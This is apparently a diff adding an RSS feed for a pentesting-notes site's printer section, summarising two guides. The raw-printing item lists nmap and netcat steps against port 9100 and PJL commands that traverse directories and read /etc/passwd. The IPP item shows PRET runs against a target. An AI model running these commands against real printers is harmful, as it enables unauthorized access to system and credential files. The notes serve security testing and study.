@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Printer on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/printer/</link>
+    <description>Recent content in Printer on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:54:51 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/printer/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Raw Printing Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/printer/raw-printing-pentesting/</link>
+      <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/printer/raw-printing-pentesting/</guid>
+      <description>Enumeration link nmap --script pjl-ready-message -p 9100 &amp;lt;target-ip&amp;gt; Connect link nc &amp;lt;target-ip&amp;gt; 9100 Commands link # See printer information @PJL INFO STATUS @PJL INFO ID @PJL INFO PRODINFO # See directories in the system @PJL FSDIRLIST NAME=&amp;#34;0:&amp;#34; ENTRY=1 @PJL FSDIRLIST NAME=&amp;#34;0:/../&amp;#34; ENTRY=1 @PJL FSDIRLIST NAME=&amp;#34;0:/../etc/&amp;#34; ENTRY=1 @PJL FSDIRLIST NAME=&amp;#34;0:/../home/&amp;#34; ENTRY=1 # See contents of a file @PJL FSUPLOAD NAME=&amp;#34;0:/../etc/passwd&amp;#34; ENTRY=1 </description>
+    </item>
+    <item>
+      <title>IPP (Internet Printing Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/printer/ipp-pentesting/</link>
+      <pubDate>Wed, 21 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/printer/ipp-pentesting/</guid>
+      <description>Access in Web Browser linkThe CUPS server can be able to access via browser.&#xA;Try input the following in the URL search form in browser.&#xA;http://&amp;lt;target-ip&amp;gt;:631 Connect linkThe Printer Exploitation Toolkit is a tool for printer secure testing. Assume that we use it.&#xA;Try all three options until the target printer recognized.&#xA;# ps: PostScript python2 pret.py &amp;lt;target-ip&amp;gt;:631 ps # pjl: Printer Job Language python2 pret.py &amp;lt;target-ip&amp;gt;:631 pjl # pcl: Printer Control Language python2 pret.</description>
+    </item>
+  </channel>
+</rss>
